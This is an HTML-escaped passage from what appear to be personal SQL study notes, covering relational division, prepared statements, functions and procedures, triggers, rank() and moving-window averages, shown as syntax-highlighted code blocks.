&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;SELECT&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;maker&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;FROM&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;SELECT&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;maker,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;model&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;FROM&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;Product&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;A&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;join&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;Printer&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;B&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;USING&lt;/span&gt;(model)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;WHERE&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;color=&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;True&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;group&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;by&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;maker&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;HAVING&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;COUNT&lt;/span&gt;(*)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;SELECT&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;COUNT&lt;/span&gt;(*)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;FROM&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;Printer&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;WHERE&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;color=&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;true&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;sql-drivers&#34; &gt;SQL Drivers
&lt;span&gt;
    &lt;a href=&#34;#sql-drivers&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;prepared-statements&#34; &gt;Prepared Statements
&lt;span&gt;
    &lt;a href=&#34;#prepared-statements&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Compile once and reuse multiple times. Avoids SQL Injection.&lt;/p&gt;
&lt;h3 id=&#34;metadata-features&#34; &gt;Metadata Features
&lt;span&gt;
    &lt;a href=&#34;#metadata-features&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;h2 id=&#34;functions-and-procedures&#34; &gt;Functions and Procedures
&lt;span&gt;
    &lt;a href=&#34;#functions-and-procedures&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;create&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;function&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;func_name(param_decls)&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;returns&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;return_type&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;create&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;procedure&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;proc_name(param_decls)&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;call&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;proc_name(params)&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;set&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;variable&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;call&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;func_name(params)&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Procedures do not have return values, rather they use out parameters. Additionally, parameters can modify whereas functions are read only. Procedures can call other procedures and functions but functions cannot call functions nor procedures. You can use functions as if they are tables/views but&lt;/p&gt;
&lt;h2 id=&#34;triggers&#34; &gt;Triggers
&lt;span&gt;
    &lt;a href=&#34;#triggers&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;p&gt;Event-Condition-Action&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;create&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;trigger&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;timeslot_check&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;after&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;insert&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;on&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;section&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;referencing&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;new&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;row&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;as&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;nrow&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;each&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;row&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/*time_slot_id not present in time_slot */&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;when&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(nrow.time_slot_id&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;not&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;time_slot_id&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;time_slot))&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;begin&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;  &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;rollback&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;end&lt;/span&gt;;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Can be before or after&lt;/li&gt;
&lt;li&gt;For each statement is also possible but only applies to after triggers
&lt;ul&gt;
&lt;li&gt;Useful for SQL statements that update a larger number of rows&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ranking&#34; &gt;Ranking
&lt;span&gt;
    &lt;a href=&#34;#ranking&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;ID,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;rank()&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;over&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;order&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;by&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(GPA)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;desc&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;as&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;s_rank&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;student_grade&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;order&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;by&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;s_rank;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;ID,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_name,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;rank()&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;over&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(partition&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;by&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_name&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;order&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;by&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(GPA)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;desc&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;as&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_rank&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;student_grade&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;order&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;by&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_name,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_rank;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;windowing-moving&#34; &gt;Windowing (Moving)
&lt;span&gt;
    &lt;a href=&#34;#windowing-moving&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;year&lt;/span&gt;,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;avg&lt;/span&gt;(num_credits)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;over&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;order&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;by&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;year&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;rows&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;preceding)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;as&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;avg_total_credits&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;tot_credits;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;year&lt;/span&gt;,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;avg&lt;/span&gt;(num_credits)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;over&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;order&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;by&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;year&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;rows&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;unbounded&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;preceding)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;as&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;avg_total_credits&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;tot_credits;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_name,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;year&lt;/span&gt;,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;avg&lt;/span&gt;(num_credits)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;over&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(partition&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span 